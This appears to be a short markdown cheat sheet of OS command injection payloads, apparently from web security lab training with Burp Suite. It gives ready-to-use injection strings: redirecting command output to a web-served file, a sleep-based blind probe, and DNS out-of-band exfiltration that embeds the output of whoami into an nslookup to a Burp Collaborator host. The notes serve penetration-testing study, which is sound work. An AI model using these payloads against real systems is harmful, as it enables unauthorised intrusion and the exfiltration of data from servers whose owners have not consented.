### Redirect Command Injection
`whoami > /var/www/images/output.txt #`
  + `#` used to _comment out_ stuff _AFTER payload_


### Blind Injection: Time Delays
`sleep 10 #`
  + `#` used to _comment out_ stuff _AFTER payload_
  
  
### Blind Injection: Out-0f-Band Communication

1. Open `Burp Collaborator Client`
  + Navigate to:
   - Burp -> Burp Collaborator Client

-----------------------------------------------------------------------

2. Use _DNS lookup_ to do **out-of-band / blind** _command injection_

```Example_cmd
    nslookup randomstuff.burpcollaborator.net #
```
  + `#` used to _comment out_ stuff _AFTER payload_
  + `nslookup` used for _DNS lookup_ (use `burpcollaborator.net`)

-----------------------------------------------------------------------

3. **Embed command** into _command injection_

```Example_Cmds_With_Embedded_$(whoami)_command
nslookup `whoami`.bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #
nslookup $(whoami).bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #
```
  + Using `backtick` and `$()` to embed _command injection_ within the _DNS Lookup_

-----------------------------------------------------------------------

